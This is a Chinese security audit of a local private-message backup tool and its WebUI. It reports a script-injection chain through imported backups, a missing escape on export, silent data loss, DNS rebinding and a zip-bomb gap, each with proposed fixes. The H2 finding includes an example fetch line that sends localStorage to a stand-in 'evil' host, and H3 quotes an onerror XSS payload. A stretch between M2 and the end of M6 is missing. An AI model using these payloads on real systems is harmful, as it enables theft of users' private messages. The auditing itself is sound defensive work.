### H2 导入他人备份包 = 在 WebUI 同源执行任意 JS

- **位置**
  - `scripts/lib/import_backup.mjs:111-141`：`ensureWrappers()` 只在**目标 `.js` 不存在**时生成受保护版本
    （`:125` 有 `<` → `\u003c` 转义）；**包内自带的 `.js` 一律原样解出、原样使用**。
  - `查看备份.html:910`：`document.write('<scr'+'ipt src="'+s.files[k]+'">…')` —— 导入的会话会被当脚本加载；
  - `server.mjs:782`：`imported/` 在静态白名单里，可直接 HTTP 取到。
- **攻击链**
  1. 攻击者构造/污染一个"私信备份包"，其中 `<dir>/messages.js` 内容写什么都可以，例如
     `window.DM_DATA=[];fetch('http://evil/?'+encodeURIComponent(JSON.stringify(localStorage)))`；
  2. 用户按官方流程"加载他人备份 → 查看"；
  3. 该脚本在 **`http://127.0.0.1:8787` 这个源**上执行 —— 与 WebUI 同源；
  4. 同源 JS 可以自己带上 `X-DM-WebUI: 1` 请求头（`guardWrite` 的另一半 `Origin` 检查此时天然同源通过），
     于是 `/api/fetch`、`/api/export`、`/api/import/upload`、`/api/session` **全部可用** ——
     可起任务、可把全部私信打包进 `exports/` 再经 `/api/download` 取走。
- **与文档的冲突**：`README.md:231`「导入别人的备份是只读的」、`使用限制.md` §分享备份之前
  —— 这两处保证的都是**服务端写操作拒绝**，没有覆盖"查看页会把包内脚本当代码执行"这一层。
- **修复建议**
  1. **首选**：导入时把包内的 `*.js` 视为不可信输入——只取其中的 `.json`，`.js` 一律由 `ensureWrappers` 重新生成
     （即把 `if (fs.existsSync(jsPath)) continue;` 改成"总是覆盖由数据生成的版本"）；
  2. 或者：导入时把包内 `*.js` 改名留存（`.js.untrusted`）并只喂 `.json` 给查看页；
  3. 纵深防御：给静态出口加 `Content-Security-Policy: default-src 'self'; script-src 'self'`，
     并让 `imported/` 只以 `application/json` / `application/octet-stream` 返回。
- **优先级**：**P0**（与 H3 同源，建议一并修）

### H3 导出的 `bundle` 少了 `</script>` 转义（同一类问题的唯一漏网路径）

- **位置**：`scripts/lib/export_engine.mjs:446`
  ```js
  entries.push({ name: `${dir}/messages.js`, data: `window.DM_DATA_${...} = ${msgJson};\n` });
  ```
  `msgJson` 未做任何转义。**对照**：`update.mjs:451` ✓ · `bili_update.mjs:578` ✓ · `doctor.mjs:58` ✓
  · `build_sessions.mjs:39` ✓ · `import_backup.mjs:125` ✓ —— **只有导出这条路径漏了**。
- **潜在影响**：一条含 `</script><img src=x onerror=…>` 的聊天消息（**对方可完全控制文本**）
  → 导出成 `bundle.zip` → 对方（或自己）导入 → 打开查看页即触发；因为导出物自带 `.js`，
  H2 里"重新生成受保护版本"的兜底也不会生效，**这个洞会原样带进对方机器**。
- **修复建议**：抽一个统一出口，杜绝以后再漏：
  ```js
  const jsAssign = (g, json) => `window.${g} = ${String(json).replace(/</g, '\\u003c')};\n`;
  ```
  然后 `export_engine.mjs` 与 `import_backup.mjs` 都只走它。
- **优先级**：**P0**（一处一行的修复，收益最大）

### H4 重建备份时"备份失败仍宣告成功"，随后清空并覆盖 —— 静默数据丢失

- **位置**：`scripts/update.mjs:184`、`scripts/bili_update.mjs:219`
  ```js
  if (REBUILD) {
    try { fs.copyFileSync(MSG_JSON, path.join(DATA_DIR, 'raw', 'messages.bak.json')); } catch {}
    log('      [重建] 忽略本地记录，按当前规则全量重抓（原数据已备份到 data/raw/messages.bak.json）');
    messages = [];
  }
  ```
- **潜在影响**：备份拷贝失败（磁盘满、文件被占用、目录只读）时异常被 `catch {}` 吃掉，
  日志**仍然宣称"原数据已备份"**，紧接着 `messages = []` 并在后续步骤写盘 →
  用户的**全量历史备份被无声清空**，且他会以为有备份。这是本次审查中唯一"不可逆损失"类问题。
- **修复建议**：把 `catch {}` 改成 `catch (e) { throw new Error('重建前备份失败，已中止以免丢数据：' + e.message); }`；
  日志改为在拷贝**成功之后**才打印。同步加一条回归断言（把 `raw/` 设为只读 → 断言非 0 退出且原文件仍在）。
- **优先级**：**P1**

## 二、🟠 中危（P1 / P2）

### M1 GET 接口无鉴权 + 未校验 `Host` → DNS rebinding 可读走全部私信

- **位置**：`server.mjs:179-195`（`guardWrite` 只保护 **POST**）；`:501-608` 的
  `/api/state`、`/api/preview`、`/api/download`、`/api/jobs`、`/api/job/stream` 均为 GET 且**无任何守卫**；
  全文件**没有 `Host` 头校验**。
- **潜在影响**：现有 CSRF 防线只覆盖写操作，读接口依赖**浏览器同源策略**；
  而 **DNS rebinding** 正好绕过它（攻击者域名重新解析到 `127.0.0.1` 之后即被判为同源）：
  攻击者页面在自己打开页面期间即可拉 `/api/preview` 拿到**私信正文**、拉 `/api/download` 取走 `exports/` 里的导出物。
  `文档/WebUI安全审计.md` §七.3 的论证（"写接口有自定义头 + 同源 Origin，已挡住浏览器侧 CSRF"）**只覆盖了写**，
  读侧的这条路径尚未被考虑。
- **修复建议**
  1. **最有效且最省事**：在 `createServer` 最前面校验 `req.headers.host` 必须匹配
     `127.0.0.1:<port>` / `localhost:<port>`，否则 403 —— DNS rebinding 的 Host 是攻击者域名，一条断言即可挡死；
  2. 可选：所有 `/api/*`（含 GET）都要求 `X-DM-WebUI: 1`（前端统一加，成本很低）；
  3. 补 `Referrer-Policy: no-referrer` 与 CSP。
- **优先级**：**P1**

### M2 静态出口把整个数据目录放出去，且允许可执行类型内联返回

- **位置**：`server.mjs:782` `STATIC_PREFIXES = ['webui/','data/','bili/','imported/','exports/','imports/','assets/']`；

- **潜在影响**：`data/`、`bili/`、`imported/` 中只要存在 `.html` / `.svg`

  `scripts/_skill/personal_tokens.local.txt` 或 `_refactor/`，而不是 stdout。
- **优先级**：**P2**

### M7 解压未限制"单条目输出上限"，zip bomb 防御有缺口

- **位置**：`scripts/lib/zip.mjs:223` `zlib.inflateRawSync(comp)` **未传 `maxOutputLength`**；
  `:216` 只校验中央目录里**声明**的 `rawSize`。
- **潜在影响**：恶意包可以声明 `rawSize = 1 MB` 而实际 inflate 出几十 GB ——
  单次分配就在 `:227` 的 `total > MAX_TOTAL` 检查**之前**把内存打爆。
  现有"2 GB 总量 + 2 万条目 + 512 MB 单文件"三道闸挡的是**声明值**，挡不住这种行为。
- **修复建议**：`zlib.inflateRawSync(comp, { maxOutputLength: MAX_ENTRY })`（Node 内置支持），
  或在 inflate 后用 `data.length` 二次校验并报错。
- **优先级**：**P2**

### M8 Python 侧依赖未锁版本（供应链）

- **位置**：`命令/图片与OCR/安装OCR环境.cmd:52`
  `pip install --no-cache-dir --quiet -i https://pypi.tuna.tsinghua.edu.cn/simple rapidocr onnxruntime pillow`；
  仓库**无** `requirements.txt` / 锁文件。
- **潜在影响**：每次安装都拉最新版，且 `--quiet` 不显示解析到的版本；
  上游任一包被投毒或镜像被替换都会**静默**进入本机 Python 环境（该环境能读到全部私信图片）。
  （Node 侧已实测**零第三方依赖、无 `package.json`** —— 这块很干净，值得保持。）
- **修复建议**：新增 `scripts/requirements-ocr.txt` 固定版本（如 `rapidocr==1.4.4` 等），
  安装脚本改为 `-r`；去掉 `--quiet` 或把 `pip freeze` 结果写进日志；
  有余力再上 `--require-hashes`。
- **优先级**：**P2**
